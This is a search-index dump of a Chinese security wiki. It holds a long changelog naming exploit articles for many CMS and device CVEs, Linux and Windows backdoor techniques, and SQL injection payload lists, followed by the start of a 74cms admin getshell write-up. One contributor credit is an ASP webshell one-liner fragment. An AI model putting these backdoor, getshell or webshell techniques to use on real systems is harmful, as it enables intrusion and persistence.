{"./":{"url":"./","title":"主页","keywords":"","body":"本网站全部文章均来源于互联网，网站中所涉及技术和工具等只供学习交流使用，不得用于实施违反法律活动，否则后果将由实施人承担。另本网站的全部文章均为互联网上所公开的文章，不涉及任何未公开的漏洞详情。 禁止将我们公开的源码搭建到公网上，仅可本地局域网使用！ 零组唯一官网：www.0-sec.org 零组资料文库项目交流群：345372491 Ps：左侧的窗口栏可以自行伸展开，另外背景的色彩也可以自行设置。 更新日志 2.44 （2020-3-18) 新增 【Web安全】 CSZ CMS （CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞 Drupal （CVE-2014-3704）Drupal （CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 （CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞 （CVE-2018-7602）Drupal 远程代码执行漏洞 （CVE-2019-6339）Drupal 远程代码执行漏洞 （CVE-2019-6341）Drupal xss漏洞 ECShop ECShop ECShop Wordpress WordPress Plugin - Search Meter 2.13.2 CSV Injection （CVE-2019-16773）WordPress 5.3.0 储存型xss 修复 修复 （CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞 不能访问的问题 优化 优化Wordpress 并进行重新分类 优化windows用户打开左边边框的便捷性 感谢@福林表哥 对部分文章的投稿 感谢@Jonsr 对部分文章的投稿 感谢@Space 师傅修改了网站的部分css代码，提高了windows用户的整体体验感 2.43 （2020-3-13) 新增 【Web安全】 Apache ShardingSphere （CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞 ShopXO ShopXO v1.8.0 后台getshell SiteServer SiteServer CMS 5.0 管理后台Cookie欺骗 【安全技术】 Linux后门 添加root用户 passwd写入 uid 0用户添加 suid 后门 reverse_shell sudoers利用 inetd 远程后门 动态链接库后门 PROMPT_COMMAND TCP Wrappers 【安全工具】 Metasploit Debian9 安装 Metasploit 修复 修复 Eyoucms 1.3.5 后台getshell 中的图片错误问题 修复 XXE 不能访问的问题 修复 Linux后门部分文章排版错误的问题 2.42 （2020-3-10) 新增 【Web安全】 74cms 74cms v6.0.4 反射型xss ActiveMQ （CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce Google （CVE-2020-6418）Chrome 远程代码执行漏洞 ModSecurity （CVE-2019-19886）ModSecurity 拒绝服务漏洞 Weblogic （CVE-2020-2555）Oracle Coherence&WebLogic 反序列化远程代码执行漏洞 WellCMS WellCMS 2.0 Beta3 后台任意文件上传 Yunyecms Yunyecms V2.0.2 前台注入漏洞（二） Yunyecms V2.0.2 后台注入漏洞（二） 【安全技术】 XXE XXE 简介 XXE 相关基础概念 XML外部实体的一些限制与解决办法 XXE 有回显利用方式总结 XXE 无回显利用方式总结 XXE XXE审计函数 Blind XXE Blind XXE 与 OOB-XXE Blind XXE 原理 XXE 利用 XXEinjector 自动化XXE注射工具 XXE 审计与利用思路 XXE 防御 【内网穿透】 reDuh 实现内网转发 Tunna 实现内网穿透 修复 修复 reGeorg 内容不适合windows用户的问题 修复【常用命令】无法打开的问题 修复 Eyoucms 1.3.5 后台getshell 图片无法打开的问题 感谢@福林表哥 师傅发现了部分链接的错误 感谢@你呀 师傅发现了部分链接的错误 感谢@福林表哥 师傅对部分文章的投稿 感谢@ [%execute request(\"Man\") 师傅对部分文章的投稿 2.41 （2020-3-6) 新增 【Web安全】 Eyoucms Eyoucms 1.3.5 后台getshell Eyoucms 1.4.3 csrf漏洞 Eyoucms 1.4.3 任意文件写入 Eyoucms 1.4.3 后台代码执行漏洞 Hfs Hfs 远程命令执行漏洞 MyBB MyBB 后台代码执行漏洞 PbootCMS （CVE-2018-16356）PbootCMS sql注入漏洞 （CVE-2018-16357）PbootCMS sql注入漏洞 QCMS QCMS 3.0 留言板xss QCMS 3.0 sql注入漏洞 QCMS 3.0 任意文件上传 QCMS 3.0 任意文件读取 YzmCMS YzmCMS V5.4 后台getshell（一） YzmCMS V5.4 后台getshell（二） 【IOT】 TP-Link （CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞 【安全技术】 Windows后门 shift后门 映像劫持 注册表自启动项 定时任务 用户登陆初始化 Logon Scripts 屏幕保护程序 自启动服务 影子用户 waitfor CLR Hijack CAccPropServicesClass and MMDeviceEnumerator 劫持MruPidlList 文件关联 AppInit_DLLs Netsh helper 利用BITS 利用inf文件实现后门 Linux后门 LKM Linux rootkit后门 感谢@福林表哥 师傅投稿的部分文章 感谢@机长 师傅投稿的部分文章 2.40 （2020-3-3) 新增 【Web安全】 CmsEasy CmsEasy 7.3.8 任意文件操作 CmsEasy 7.3.8 sql注入漏洞 CmsEasy 7.3.8 本地文件包含漏洞 GoAhead （CVE-2019-5096） 远程代码溢出漏洞 Phpmyadmin （CVE-2018-19968）Phpmyadmin 文件包含漏洞 Imcat Imcatcms 4.2 后台文件包含getshell （CVE-2018-20605）Imcat 4.4 任意代码执行漏洞 （CVE-2018-20606）Imcat 4.4 敏感信息泄露 （CVE-2018-20607）Imcat 4.4 敏感信息泄露 （CVE-2018-20608）Imcat 4.4 敏感信息泄露 （CVE-2018-20609）Imcat 4.4 敏感信息泄露 （CVE-2018-20610）Imcat 4.4 敏感信息泄露 （CVE-2018-20611）Imcat 4.4 xss Fortinet FortiOS （CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞 （CVE-2018-13380）Fortinet FortiOS xss漏洞 （CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞 （CVE-2018-13382）Fortinet FortiOS magic后门 （CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞 Wordpress Wordpress 5.2.4 cors跨域劫持漏洞 X5music X5music 后台登陆绕过+后台getshell Zzcms Zzcms 8.2 任意用户密码修改 Zzzcms Zzzcms 1.75 后台爆破+验证码问题 Zzzcms 1.75 xss漏洞 Zzzcms 1.75 后台任意文件读取 感谢@PANDA墨森 师傅提供的部分资料 感谢@福林表哥 师傅提供的部分资料 2.39 （2020-2-29) 新增 【Web安全】 Adobe ColdFusion （CVE-2010-2861）Adobe ColdFusion 文件读取漏洞 （CVE-2017-3066）Adobe ColdFusion 反序列化漏洞 Discuz Discuz!X 3.4 任意文件删除漏洞 Django （CVE-2017-12794）Django debug page XSS漏洞 （CVE-2018-14574）Django Microsoft Exchange （CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞 ImageMagick （CVE-2016-3714）ImageMagick 命令执行漏洞 【安全技术】 Disable function 常规绕过 利用环境变量 LD_PRELOAD 绕过 mail error_log imagemagick+GhostScript 利用 pcntl_exec 绕过 利用 imap_open函数任意命令执行 利用系统组件 window com 绕过 利用 Apache+mod_cgi+.htaccess 绕过 利用 ImageMagick 漏洞绕过（一） 利用 ImageMagick 漏洞绕过（二） 利用 ShellShock 绕过 Linux后门 LINUX反弹shell SSH后门 SSH wrapper SSH 软连接后门 SSH 公钥免密登陆 SSH Keylogger strace监听ssh来源流量 Cron后门 hiding-from-cats vim 后门 （CVE-2019-12735）vim modeline vim python 拓展后门 Linux/Unix 隐藏文件和文件夹 建立隐藏文件/文件夹 建立..文件/文件夹 参数混淆拦截rm 创建不能删除的文件（权限隐藏） 删除/隐藏历史操作命令 2.38 （2020-2-25) 新增 【Web安全】 ActiveMQ （CVE-2015-5254）ActiveMQ 反序列化漏洞 AppWeb （CVE-2018-8715）AppWeb认证绕过漏洞 Cacti （CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞 ThinkCMF （CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞 Hashbrown CMS （CVE-2020-6948）HashBrown CMS 远程命令执行漏洞 （CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞 Finecms （CVE-2018-18191）Finecms 5.4 存在CSRF漏洞 FasterXML jackson （CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞 Yunyecms Yunyecms V2.0.2 后台注入漏洞 Yunyecms V2.0.2 前台注入漏洞 修复 修复浏览器的错别字。 禅知 Pro 1.6 前台任意文件读取 文中的某处代码错误。 感谢@后来者 师傅提供了网站中的错误问题。 感谢@TWal0ne 师傅提供了网站中的错误问题。 感谢@小鸿 师傅提供的部分资料 感谢@福林表哥 师傅提供的部分资料 感谢@Aur0Ra 师傅提供的部分资料 2.37 （2020-2-21) 新增 【Web安全】 PageMyAdmin PageMyAdmin文件上传getshell PageMyAdmin sql注入漏洞 PhpYun Phpyun v3.1 xml 注入漏洞 Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞 Phpyun v5.0.1 后台getshell Jboss 访问控制不严导致的漏洞 JMX Console未授权访问Getshell （CVE-2007-1036）JMX Console HtmlAdaptor Getshell （CVE-2010-0738）JMX控制台安全验证绕过漏洞 Administration Console 弱口令 Getshell 反序列化漏洞 （CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞 （CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞 （CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 （CVE-2017-12149）JBosS AS 6.X 反序列化漏洞 Thinkphp Thinkphp 3.x sql注入漏洞 Thinkphp 3.x order by 注入漏洞 Thinkphp 3.2.3 update注入漏洞 Thinkphp 3.2.3 select&find&delete 注入漏洞 Tomcat （CVE-2020-1938）Apache Tomcat 文件包含漏洞 致远oa 致远OA Session泄漏漏洞 致远OA A6 test.jsp sql注入漏洞 致远OA A6 search_result.jsp sql注入漏洞 致远OA A6 setextno.jsp sql注入漏洞 致远OA A6 重置数据库账号密码漏洞 致远OA A6 敏感信息泄露（一） 致远OA A6 敏感信息泄露（二） 致远OA A8 未授权访问 致远OA A8 任意用户密码修改漏洞 致远OA A8 系统远程命令执行漏洞 致远OA A8-m 后台万能密码 致远OA A8-m 存在sql语句页面回显功能 致远OA A8-v5 无视验证码撞库 致远OA A8-v5 任意用户密码修改 感谢@毒刺 师傅提供的部分资料 感谢@@dejavu 师傅提供的部分资料 感谢@@' 小陈 师傅提供的部分资料 感谢@@初梦、 师傅提供的部分资料 2.36 （2020-2-19) 新增 【Web安全】 Apache Dubbo （CVE-2019-17564）Apache Dubbo 反序列化漏洞 Apache FusionAuth （CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞 Django （CVE-2020-7471）Django sql注入漏洞 Mariadb （CVE-2020-7221）Mariadb 提权漏洞 Thinkphp 5.x 命令执行漏洞 Thinkphp 5.0.11 Weblogic （CVE-2019-2725）（CNVD-C-2019-48814） FasterXML jackson （CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞 Fastjson Fastjson 1.2.22 - 1.2.24 反序列化漏洞 SQL Server （CVE-2020-0618）SQL Server 远程代码执行漏洞 Yunucms Yunucms v2.0.7 后台xss Yunucms v2.0.7 数据库泄露 禅道 禅道 11.6 sql注入漏洞 禅道 11.6 任意文件读取 禅道 11.6 远程命令执行漏洞 2.35 （2020-2-11) 新增 【Web安全】 Discuz （CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell YzmCMS YzmCMS v3.6 csrf YzmCMS v3.6 远程命令执行 （CVE-2018-7653）YzmCMS v3.6 xss漏洞 （CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞 （CVE-2018-19092）YzmCMS v5.2 xss漏洞 YzmCMS V5.3 后台ssrf 优化 【Web安全】 Seacms 2.34 （2020-2-9) 新增 【Web安全】 Cobub Razor （CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞 （CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户 （CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞 Couchcms （CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞 OKLite OKLite v1.2.25 SQL注入导致getshell(前台) （CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞 （CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞 XStream （CVE-2019-10173）Xstream 远程代码执行漏洞 2.33 （2020-2-6) 新增 【Web安全】 Cobub Razor （CVE-2018-8056/CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞 【IOT】 Huawei （CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞 【内网穿透】 Anydesk 修复 【域渗透】 4.2.1.2 建立 IPC 连接、copy 文件、创建计划任务 修复文中部分代码错误。 感谢 @Adminxe 发现并向我们反馈了这个问题。 【IOT】 Amazon Kindle Fire HD (3rd) 修复无法打开的问题。 感谢 @后来者 发现并向我们反馈了这个问题。 感谢 @福林表哥 投稿的部分文章 2.32 （2020-2-4) 新增 【IOT】 360 360 Phone N6 Pro内核漏洞 Amazon Kindle Fire HD (3rd) （CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11022）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 （CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 Cisco （CVE-2019-1663）堆栈缓冲区溢出漏洞 D-Link （CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞 （CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞 （CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞 （CVE-2019-7297）D-Link DIR-823G 命令注入漏洞 （CVE-2019-7298）D-Link DIR-823G 命令注入漏洞 （CVE-2019-16920）D-Link rce Sapido Sapido多款路由器命令执行漏洞&突破 优化 【Tools】 修复了Burpsuite的拼写错误。 增加了cms识别字典的下载地址。 2.31 （2020-1-30) 新增 【Web安全】 Semcms Semcms PHP(多语)版 V3.9 sql注入漏洞 Semcms v3.8 sql注入漏洞 Semcms v3.5 sql注入漏洞 Semcms v2.7 密码找回漏洞 Semcms v2.7 sql注入漏洞 【Windows取证】 2.30 （2020-1-27) 新增 【Tools】 Cobalt Strike 4.0 8.Lateral Movement 修复 Sqlmap部分文章因目录问题所产生的打不开现象。 感谢 @天乐 师傅赞助的cdn节点。 2.29 （2020-1-23) 完善漏洞库，修复部分文中的错误并正式上线。 2.28 （2020-1-20) 汉化 Cobalt Strike 4.0 官方英文版教程 2.27 （2019-12-30) 完结 Cobalt Strike 2.26 （2019-12-26) 新增 【Web安全】 Eyoucms Eyoucms 1.39 前台sql注入 【Tools】 Cobalt Strike 2.25 （2019-12-25) 新增 【Web安全】 Phpmyadmin （CVE-2019-18622）Phpmyadmin xss 74cms 74cms v5.0.1前台sql注入 【Tools】 Burpsuit Burpsuite 自动化blind-xss插件 【内网渗透】 内网穿透工具 Teamviewer内网穿透（二） 2.24 （2019-12-24) 新增 【域渗透】 感谢@whojeff 师傅提供的域渗透文章！！！ 2.23 （2019-12-22) 新增 【漏洞库】 WordPress WordPress （CVE-2018-6389）WordPress WordPress Plugin - NextGEN Gallery Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞 （CVE-2017-8295）WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞 （CVE-2019-8943）WordPress 5.0 RCE Wordpress （CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入 WordPress Plugin - Easy WP SMTP 反序列化漏洞 WordPress Plugin - Quizlord 2.0 XSS （CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS WordPress Plugin - AutoSuggest sql注入 Thinkphp （CVE-2018-16385）Thinkphp 5.1.x SQL注入 2.22 （2019-12-21) 新增 【漏洞库】 Eyoucms Eyoucms 1.42 后台插件getshell Maccms Maccms 8.x post注入 Thinkphp 反序列化漏洞 Thinkphp 5.1.37 反序列化漏洞 Thinkphp 5.2.*-dev 反序列化漏洞 Thinkphp 6.0.*-dev 反序列化漏洞 Wordpress （CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞 【Tools】 子域名扫描 FuzzScan OneForAll 指纹识别 cms 指纹识别 waf 指纹识别 【优化】 Windows提权exp表格 感谢@毒刺 师傅提供的部分文章 2.21 （2019-12-19) 新增 【漏洞库】 Docker （CVE-2019-14271）Docker copy漏洞 Eyoucms EyouCMS后台注入 Emlog Emlog phpinfo 泄漏 Emlog 友情链接自助插件存在SQL注入漏洞 Emlog 相册插件前台SQL注入+Getshell Emlog 6.0 后台暴力破解 Emlog 6.0 数据库备份与导入功能导致后台getshell Emlog 6.0 xss集合 Emlog 越权&后台getshell PHPOK PHPOK 5.3 前台注入 PHPOK 5.3 前台无限制注入 YouDianCMS YouDianCMS 8.0 sql注入漏洞 YouDianCMS 8.0 StoreageXSS 有道云笔记 有道云笔记/印象笔记 windows客户端代码执行&本地文件读取 【IOT】 TP-Link （CVE-2017-16957）TP-Link 命令注入漏洞 【Tools】 Sqlmap ProxySqlMap version 0.2 感谢@红炉点雪 师傅投稿的部分文章 2.20 （2019-12-16) 新增 【漏洞库】 74cms 74cms v5.0.1远程执行代码 JYmusic JYmusic 1.x 版本 前台getshell JYmusic 2.0 前台XSS漏洞 JYmusic 2.0 命令执行漏洞 Ueditor 百度ueditor编辑器 xss漏洞 【iot】 默认设备密码 感谢@友人A 师傅对部分文章的投稿 感谢@毒刺 师傅对部分文章的投稿 2.19 （2019-12-16) 新增 【漏洞库】 Apache （CVE-2017-15715）Apache解析漏洞 Maccms Maccms后门 Webmin （CVE-2019-15107）Webmin 远程命令执行漏洞 微擎 微擎 绕过禁用函数写shell 微擎 后台getshell 微擎 低权限后台getshell优化 增加一键复制代码功能 增加自动跳回顶部功能 增加图片点击可放大功能 修复（CVE-2016-3088）ActiveMQ应用漏洞 图片太小导致访问不便的问题 修复 weblogic爆破 图片太小导致访问不便的问题 感谢@福林表哥 师傅对部分文章的投稿 感谢@天乐 师傅赞助的cdn 2.18 （2019-12-15) 本次更新迫不得已增加页面底部印记，全站图片增加水印。 没有说不能爬下来使用，但是麻烦哪些爬下来的请不要搭建到公网上，打包成pdf的注明来源 好自为之 2.17 （2019-12-14) 新增 【漏洞库】 CatfishCMS CatfishCMS 4.5.7 xss CatfishCMS 4.5.7 csrf getshell CatfishCMS 4.6.15 后台文件包含getshell CatfishCMS 4.6.15 csrf getshel Discuz Discuz! X系列全版本后台Sql注入漏洞 Eyoucms Eyoucms 1.4.2 sql注入 FastJson Fastjson Fastjson Mintinstall （CVE-2019-17080）Mintinstall object injection Weblogic （CVE-2019-2890） Weblogic T3 Analysis 【tools】 Burpsuit Burpsuit 伪造ip爆破脚本 2.16 （2019-12-10) 优化 对网站的搜索功能进行了修改，现已支持全文搜索。 对网站的部分目录进行优化 新增 【漏洞库】 CatfishCMS CatfishCMS 4.6.15 前台xss Flash Flash钓鱼源码 IonizeCMS （CVE-2017-5961）IonizeCMS xss IonizeCMS sql注入 Wordpress （CVE-2019-19133）WordPress CSS Hero 4.0.3 反射xss UsualToolcms UsualToolcms 8.0 系统重装漏洞 UsualToolcms 8.0 前台任意文件删除 UsualToolcms 8.0 绕过后台验证码爆破 UsualToolcms 8.0 后台GETSHELL UsualToolcms 8.0 后台盲注 UsualToolcms 8.0 前台sql 通达oa 通达oa 2011-2013 通杀GETSHELL （WooYun-2014-82678）通达oa 未授权获取帐号 通达oa XFF导致日志混淆 通达oa ⻚面敏感信息泄露 通达oa 任意账号跳转 通达oa 文件包含漏洞 通达oa sql注入 通达oa xss 通达oa 越权访问 通达oa 数据库脚本导⼊getshell 通达oa 通达oa 任意⽂件上传漏洞 通达oa 11.2后台getshell 【tools】 浏览器插件 Set Character Encoding 感谢@福林表哥 师傅对部分文章的投稿 2.15 （2019-12-3) 新增 【漏洞库】 Finecms Finecms 5.0.10多重漏洞 （CVE-2018-6893）Finecms SQL注入漏洞 Google （CVE-2019-5786）Chrome 远程代码执行漏洞 Jenkins Jenkins功能未授权访问导致的远程命令执行漏洞 YXcms YXcmsApp 1.4.3任意用户密码重置漏洞 YXCMS 1.4.7储存型xss YXCMS 1.4.7任意文件删除 YXCMS 1.4.7任意文件写入 YXCMS 1.4.7SQL注入 （CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞 【补充】 Phpmyadmin （CVE-2018-12613）phpmyadmin远程文件包含漏洞 感谢@友人A 师傅对（CVE-2018-12613）phpmyadmin远程文件包含漏洞作出的补充说明 感谢@福林表哥 师傅对部分文章的投稿 感谢@毒刺 师傅对部分文章的投稿 2.14 （2019-11-30) 新增 【漏洞库】 Dedecms Dedecms找后台 Dedecms swf文件反射型xss 【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞 【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改 【开启会员注册】（SSV-97087）DeDecms 任意用户登录 （CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞 （CVE-2018-9175）Dedecms V5.7后台的两处getshell （CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell Gitbook （CVE-2017-15688）Gitbook任意文件读取 Maccms Maccms8.x(苹果cms)命令执行漏洞 （CVE-2019-9829）Maccms背景任意文件写入getshell Seacms Seacms V8.7版本SQL注入 Seacms Seacms9.92越权+Getshell Zzcms zzcms2018最新版重装getshell （CVE-2018-13056）Zzcms 任意文件删除 （CVE-2018-14961）Zzcms 前台sql注入 （CVE-2018-14963）Zzcms csrf （CVE-2018-14962）Zzcms储存型xss 禅知 禅知Pro 1.6 前台任意文件读取 禅知后台getshell 【Tools】 浏览器插件 Cookie-Editor Hackbar Swichsharp User-Agent Switcher XssSniper 【修改】 鲶鱼cms代码执行 感谢@友人A 师傅提出的鲶鱼cms中的错误 2.13 （2019-11-28) 新增 【团队介绍页面】 【漏洞库】 CatfishCMS CatfishCMS后台csrf CatfishCMS后台储存型xss CatfishCMS远程命令执行 Phpmyadmin （CVE-2018-12613）phpmyadmin远程文件包含漏洞 ActiveMQ （CVE-2016-3088）ActiveMQ应用漏洞 【sql】 sqlmap tamper sqlmap bypass 安全狗 tamper 感谢@Ascotbe 师傅分享的部分文章 2.12 （2019-11-27) 新增 【漏洞库】 Apache Apache Flink Dashboard 未授权访问-远程代码命令执行 GetSimple CMS （CVE-2019-11231）GetSimple CMS 远程命令执行 SeaCMS 海洋CMS V6.28远程代码执行 海洋CMS V6.45远程代码执行 海洋CMS V6.54远程代码执行 海洋CMS V6.55远程代码执行 【内网渗透】 利用windows api dump进程 【sql】 sqlmap sqlmap参数说明 sql注入payloads 通用SQL注入Payloads 常规 Error Based Payloads 通用 Time Based SQL Injection Payloads 通用 Union Select Payloads SQL注入 Auth Bypass Payloads 感谢@Ascotbe 师傅分享的部分文章 2.11 （2019-11-25) 新增 【漏洞库】 Wordpress （CVE-2019-17671）Wordpress未授权访问 Seacms Seacms储存型xss Seacms getshell OpenSNS OpenSNS sql注入 OpenSNS 后台getshell Niushop Niushop sql注入 Django （CVE-2019-14234）Django JSONField SQL注入 Newbee-mall （CVE-2019-19113）新蜂商城sql注入 R&D Visions CMS R&D Visions CMS SQL Injection Xfilesharing （CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell （CVE-2019-18952）Xfilesharing 2.5.1本地文件包含 【提权exp】 win CVE-2019-1405 【iot】 PHICOMM （CVE-2019-19117）PHICOMM 远程代码执行 感谢@Puppy。 师傅分享的CVE-2019-1405 2.10 （2019-11-22) 新增 sql Tor-IP-Changer实现Sqlmap自动切换代理IP Sqlmap rps脚本 禅道 禅道8.2-9.2.1注入GetShell Eyoucms Eyoucms1.0前台getshell THINKCMF THINKCMFX_2.2.3漏洞合集 MetInfo MetInfo系统中一处旧插件导致的ssrf Metinfo 6.1.2 SQL注入 MetInfo 任意文件读取 PbootCMS PbootCMS sql 注入 PbootCMS csrf 74cms 新版74cms v4.2.1-v4.2.129-后台getshell漏洞 新版74cms v4.2.126-前台四处sql注入 新版74cms v4.2.126-任意文件读取漏洞 新版74cms v4.2.126-通杀sql注入 新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞 内网渗透 内网渗透之获取windows远程桌面（RDP）连接记录 补充 vBulletin （CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit 2.09 （2019-11-20） 新增 Php PHP序列化和反序列化语法差异问题 Apache （CVE-2019-0193）Apache Solr 远程命令执行漏洞 上传绕过 user_ini的利用 修复 修复了win.zip不能下载的问题 2.08 （2019-11-19） 新增 YouPHPTube-Encoder （CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129）YouPHPTube-Encoder 2.3 多个远程代码执行漏洞 Computrols CBAS Web （CVE-2019-10846）Computrols CBAS Web反射型xss （CVE-2019-10848）Computrols CBAS Web 用户名枚举 （CVE-2019-10852）Computrols CBAS Web SQL注入 Weblogic (CVE-2019-2618) 移动安全 SpyNote5.0客户端APK逆向分析 sql sqlmap tamper速查梳理 提权exp CVE-2019-1405/CVE-2019-1322 感谢@毒刺 师傅分享的Weblogic 感谢@Mannix 师傅发现了排版的错误 2.07 （2019-11-13） 新增 Apache Flink Dashboard 未授权访问-远程代码命令执行 Gitlab wiki 储存型xss （CVE-2019-16662）rConfig远程命令执行Coremail Coremail配置文件信息泄漏 JCG路由器命令执行漏洞 eyoucms 1.3.9上传漏洞 （CVE-2019-7609）kibana原型链污染导致的RCE 感谢@毒刺 师傅投稿的JCG路由器命令执行漏洞 2.06 （2019-11-8） 更正 D-Link DIR-823G(CVE-2019-15529)不能访问的问题 ActiveMQ排版顺序出错的问题 感谢@chacha 师傅的提醒，更正了ActiveMQ的排版顺序问题 2.05 （2019-11-7） 本次更新请各位师傅们清除一下本网站的缓存！！！ 本次更新请各位师傅们清除一下本网站的缓存！！！ 本次更新请各位师傅们清除一下本网站的缓存！！！ 新增 win提权exp win提权exp辅助脚本 linux提权exp IOT D-Link DIR-823G(CVE-2019-15529) 感谢@毒刺 师傅发现了windows提权exp不能下载的问题 2.04 （2019-11-6） 新增 ActiveMQ ActiveMQ物理路径泄漏漏洞 （CVE-2016-3088）ActiveMQ应用漏洞 （CVE-2017-15709）ActiveMQ 信息泄漏漏洞 内网穿透 ew lcx nc reGeorg ewssocks teamviewer 内网渗透 bypass 金山毒霸 DBscanner windows常用程序密码读取工具 IOT (CVE-2019-13128)D-Link DIR-823G命令注入漏洞 常用命令 sql server常用操作远程桌面命令 msfvenom常用生成payload命令 感谢@っ、Emotional 师傅投稿的ActiveMQ部分文章 2.03 （2019-11-5） 新增 Weblogic Weblogic爆破 （CVE-2017-3248） （CVE-2017-3506） （CVE-2017-10271） （CVE-2018-2628） （CVE-2018-2893） （CVE-2018-2894） （CVE-2018-3191） （CVE-2018-3245） （CVE-2019-2725）（CNVD-C-2019-48814） 上传绕过 上传绕过总结 常用命令 基础网络命令 路由常用命令 域操作命令 Dos快捷命令 Windows端口转发 Powershell基础命令 Powershell常用命令 Powershell注册表操作 Powershell操作注册表权限 修复 修复目录的数字显示，让阅读变得更加便捷。 感谢@毒刺 师傅提供的部分Weblogic的漏洞 感谢@っ、Emotional 师傅投稿的Weblogic部分文章 感谢@牙疼吃糖 师傅的提示，更正了Weblogic的错误 2.02 （2019-11-5） 新增 php php mt_rand函数的安全问题探讨 sql sqlmap sqlmap udf提权过程 sqlmap udf提权原理 sqlmap os-shell提权过程 sqlmap tamper bypass d盾tamper bypass 云锁tamper sql提权手工辅助 UDF手工提权辅助 MOF手工提权辅助 S A手工提权辅助 sqlmap+burp辅助批量注入验证 SleuthQL工具 2.01 （2019-11-4） 新增 Wordpress WordPress Google Review Slider 6.1 SQL Injection （从xss到getshell） xss的深层次利用与探讨 （CVE-2017-6514）敏感信息泄漏 （CVE-2019-16219）内置编辑器Gutenberg 储存型xss （CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss （CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss （CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss （CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) 致远oa 致远oa命令执行 更正 Apache 中的错别字 Discuz 文中的漏洞影响范围 感谢@夕颜 @Space 师傅指出问题，我们已经及时更正。 感谢@毒刺 师傅的提醒，我们增加了致远oa命令执行的文章 2.0 （2019-11-4） 更换新的框架 增加搜索功能 完善0day库，后续将陆续增加之前的库存 1.0 （2019-10-31） 新增 Apache Nexus Smarty ThinkPHP ThinkCMF Apache Tomcat WordPress 修复 修复手机端无法显示菜单列表 修复Apache，Smarty文章内图片显示错误 优化 优化页面效果，提升页面流畅度 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-18 15:26:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.1-v4.2.129-后台getshell漏洞.html":{"url":"0day/74cms/新版74cms v4.2.1-v4.2.129-后台getshell漏洞.html","title":"74cms v4.2.1 - v4.2.129-后台getshell漏洞","keywords":"","body":"74cms v4.2.1-v4.2.129-后台getshell漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02漏洞演示 